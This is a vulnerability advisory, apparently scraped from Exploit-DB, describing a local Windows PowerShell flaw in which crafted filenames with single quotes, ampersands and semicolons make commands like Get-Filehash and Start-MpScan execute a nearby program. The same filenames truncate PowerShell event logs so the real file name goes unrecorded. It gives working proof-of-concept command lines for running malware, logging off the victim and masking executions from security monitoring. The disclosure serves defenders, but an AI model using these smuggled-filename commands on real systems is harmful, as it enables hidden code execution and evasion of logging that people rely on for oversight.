{"source": "https://www.exploit-db.com/exploits/51843", "vulnName": "Windows PowerShell - Event Log Bypass Single Quote Code Execution", "vulnEDBID": "51843", "vulnCVE": "N/A", "author": "HYP3RLINX", "exploitType": "LOCAL", "platform": "WINDOWS_X86-64", "datePublished": "2024-03-03", "vulnContent": "[+] Credits: John Page (aka hyp3rlinx)  \n[+] Website: hyp3rlinx.altervista.org\n[+] Source:  http://hyp3rlinx.altervista.org/advisories/WINDOWS_POWERSHELL_SINGLE_QUOTE_CODE_EXEC_EVENT_LOG_BYPASS.txt\n[+] twitter.com/hyp3rlinx\n[+] ISR: ApparitionSec     \n \n\n[Vendor]\nwww.microsoft.com\n\n\n[Product]\nMicrosoft Windows PowerShell\n\nBuilt on the . NET Framework, Windows PowerShell helps IT professionals and power users control and automate the administration of the Windows operating system and applications that run on Windows.\n\n\n[Vulnerability Type]\nPowerShell Single Quote Code Execution / Event Log Bypass\n\n\n[CVE Reference]\nN/A\n\n\n[Security Issue]\nIn past times I disclosed how PowerShell executes unintended files or BASE64 code when processing specially crafted filenames.\nThis research builds on my \"PSTrojanFile\" work, adding a PS command line single quote bypass and PS event logging failure.\nOn Windows CL tab completing a filename uses double quotes that can be leveraged to trigger arbitrary code execution.\nHowever, if the filename gets wrapped in single quotes it failed, that is until now.\n\n[Single Quote Code Exec Bypass]\nCombining both the semicolon \";\" and ampersand \"&\" characters, I found it bypasses the single quote limitation given a malicious filename.\nThe trailing semicolon \";\"  delimits the .XML extension and helps trigger the PE file specified in the case DOOM.exe and the PS event log gets truncated.\n\nTake the following three test cases using Defender API which takes a specially crafted filename.\nC:\\>powershell Set-ProcessMitigation -PolicyFilePath  \"Test;saps DOOM;.xml\"\n\n1) Double quotes OK\n\"Test;saps DOOM;.xml\" \n\n2) Single quotes FAILS\n'Test;saps DOOM;.xml'\n\n3) Single quotes BYPASS\n'Test&DOOM;.xml'\n\nPowerShell API calls that prefix the \"powershell\" cmd is a requirement and may affect many built-in PS API or module commands.\nC:\\Users\\gg\\Downloads\\>powershell Start-MpScan -Scanpath 'C:\\Users\\gg\\Downloads\\Infected&Malware;.zip'\n\nMalware.exe lives in Downloads dir, notice how we only need a partial name as part of the .ZIP archive filename we are scanning here\nand that it also excludes the .EXE portion in that filename.\n\n\n[PS Event Log Bypass]\nOn Windows PowerShell event logging can be enabled to alert a SOC on suspicious activity and or for incident response forensic artifact purposes.\nHowever, when bypassing PS single quotes I noticed an interesting side effect. The ampersand \"&\" character seems to truncate the PS event log.\nExample, processing 'Infected&Malware;.zip' the Event ID 403 logs 'infected' and not the true name of 'Malware.exe' which was actually executed.\n\nWant to mask the true name of the file from PowerShell Event logging? (Malware.exe lives in the same directory)\nC:\\>powershell Get-Filehash  'Infected&Malware;.zip'  -algorithm MD5\n\nBelow the event log HostApplication contains 'infected' and not the true name of Malware.exe that was actually executed due to truncating.\n\n[PS Log ID 403 Snippet]\nEngine state is changed from Available to Stopped. \n\nDetails: \n NewEngineState=Stopped\n PreviousEngineState=Available\n\n SequenceNumber=25\n\n HostName=ConsoleHost\n HostVersion=5.1.19041.1682\n HostId=fecdc355-0e89-4d4c-a31d-7835cafa44f0\n HostApplication=powershell get-filehash 'Infected\n EngineVersion=5.1.19041.1682\n\n\n[Exploit/POC]\npowershell Get-Filehash  'Infected&Malware;.zip'  -algorithm MD5\n\nRun some malware plus bypass logging of true file name:\nC:\\Users\\gg\\Downloads>powershell get-filehash  'Infected&Malware;.zip'  -algorithm  md5\nPE file Malware.exe in the Downloads directory, notice the .zip we are scanning doesn't include .exe in the filename.\n\nDefender Anti-Malware API:\npowershell Start-MpScan -Scanpath 'C:\\Users\\gg\\Downloads\\Infected&Malware;.zip'\n\nCall ping cmd using double \"&\":\nC:\\>powershell Get-Filehash  'powerfail&ping 8.8.8.8&.txt'  -algorithm  md5\n\nCall a Windows cmd to Logoff the victim:\nC:\\>powershell Start-MpScan -Scanpath 'virus&logoff&test.zip'\n\nWe have options:\n\nA) to call commands use double \"&\" --> 'virus&logoff&test.zip'\nB) bypass PS event logging of the true file name and execute code use \"&\" with \";\" --> 'Infected&Malware;.zip'\n\n\n[References]\nhttps://github.com/hyp3rlinx/PSTrojanFile\nhttps://hyp3rlinx.altervista.org/advisories/MICROSOFT_DEFENDER_ANTI_MALWARE_POWERSHELL_API_UNINTENDED_CODE_EXECUTION.txt\nhttps://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-POWERSHELL-UNSANITIZED-FILENAME-COMMAND-EXECUTION.txt\n\n\n[Network Access]\nLocal\n\n\n[Severity]\nHigh\n\n\n[Disclosure Timeline]\nVendor Notification: circa 2019\nDecember 27, 2023 : Public Disclosure\n\n\n\n[+] Disclaimer\nThe information contained within this advisory is supplied \"as-is\" with no warranties or guarantees of fitness of use or otherwise.\nPermission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and\nthat due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit\nis given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility\nfor any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information\nor exploits by the author or elsewhere. All content (c).\n\nhyp3rlinx\n            "}